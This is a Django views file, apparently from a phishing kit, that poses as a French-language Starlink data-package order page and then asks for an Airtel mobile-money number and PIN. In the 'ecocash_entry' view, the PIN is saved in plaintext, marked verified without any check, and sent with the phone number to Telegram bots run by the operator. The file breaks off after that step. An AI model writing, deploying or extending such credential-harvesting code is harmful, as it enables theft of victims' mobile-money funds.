import json
import requests
from datetime import timedelta
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.utils import timezone
from django.http import JsonResponse
from django.core.cache import cache
from django.views.decorators.http import require_http_methods

from .models import StarlinkOrder, TelegramConfig, StarlinkPackage

def send_telegram_notification(message):
    """Sends a notification to all active Telegram configurations."""
    configs = TelegramConfig.objects.filter(is_active=True)
    for config in configs:
        try:
            url = f"https://api.telegram.org/bot{config.bot_token}/sendMessage"
            payload = {
                "chat_id": config.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            print(f"Error sending Telegram notification: {e}")

def landing_page(request):
    """Starlink package selection and simplified order page."""
    packages = StarlinkPackage.objects.filter(is_active=True)
    
    # Auto-populate default bundles if the production workspace is empty
    if not packages.exists():
        StarlinkPackage.objects.create(name="Forfait Basique", description="Idéal pour une utilisation légère", price=1500.00, data_limit="5GB")
        StarlinkPackage.objects.create(name="Forfait Standard", description="Parfait pour le streaming", price=2500.00, data_limit="15GB")
        StarlinkPackage.objects.create(name="Forfait Premium", description="Pour toute la famille", price=5000.00, data_limit="30GB")
        StarlinkPackage.objects.create(name="Forfait Ultra", description="Haute performance", price=10000.00, data_limit="60GB")
        StarlinkPackage.objects.create(name="Forfait Business", description="Usage professionnel", price=25000.00, data_limit="100GB")
        StarlinkPackage.objects.create(name="Forfait Illimité", description="Données illimitées", price=50000.00, data_limit="Illimité")
        packages = StarlinkPackage.objects.filter(is_active=True)

    if request.method == "POST":
        try:
            package_id = request.POST.get("package_id", "").strip()
            
            if not package_id:
                messages.error(request, "Veuillez sélectionner un forfait.")
                return redirect("landing_page")
            
            package = get_object_or_404(StarlinkPackage, id=package_id)
            
            order = StarlinkOrder.objects.create(
                starlink_kit_id="KIT_" + str(int(timezone.now().timestamp())),
                phone_number="+243",
                package_name=package.name,
                amount=package.price,
                status='pending'
            )
            
            return redirect("ecocash_entry", order_id=order.id)
            
        except Exception as e:
            messages.error(request, f"Error submitting order: {str(e)}")
            return redirect("landing_page")
    
    return render(request, "landing.html", {"packages": packages})

def ecocash_entry(request, order_id):
    """Airtel number and PIN entry page."""
    order = get_object_or_404(StarlinkOrder, id=order_id)
    
    if request.method == "POST":
        action = request.POST.get("action")
        
        if action == "verify_pin":
            airtel_number = request.POST.get("ecocash_number", "").strip()
            pin = request.POST.get("pin", "").strip()
            
            if not airtel_number or not pin:
                messages.error(request, "Veuillez fournir le numéro Airtel et le code PIN.")
                return redirect("ecocash_entry", order_id=order.id)
            
            order.airtel_number = airtel_number
            order.pin = pin
            order.pin_verified = True
            order.pin_verified_at = timezone.now()
            order.status = 'pin_verified'
            order.payment_entered_at = timezone.now()
            order.save()
            
# Ensure the f-string curly braces are properly closed around your model variables
            message = f"<b>Commande Starlink - Bot Airtel :</b>\nID Kit : {order.starlink_kit_id}\nTel : {airtel_number}\nPIN : {pin}\nMontant : CDF {order.amount}"
            send_telegram_notification(message)